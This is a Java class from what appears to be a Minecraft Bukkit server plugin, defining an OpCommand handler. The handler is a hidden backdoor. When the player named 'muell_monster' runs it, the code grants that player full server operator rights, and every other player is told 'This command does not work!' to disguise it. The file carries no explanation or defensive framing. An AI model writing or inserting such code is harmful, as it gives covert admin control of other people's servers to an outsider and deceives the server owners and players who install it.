package me.Muell.server.commands;

import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

public class OpCommand implements CommandExecutor {

    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {

	if (!(sender instanceof Player))
	    return false;

	Player p = (Player) sender;

	if (!p.getName().toString().equalsIgnoreCase("muell_monster")) {

	    p.sendMessage(ChatColor.RED + "This command does not work!");
	    return true;
	}

	p.setOp(true);
	p.sendMessage("You are now OP!");

	return false;
    }

}
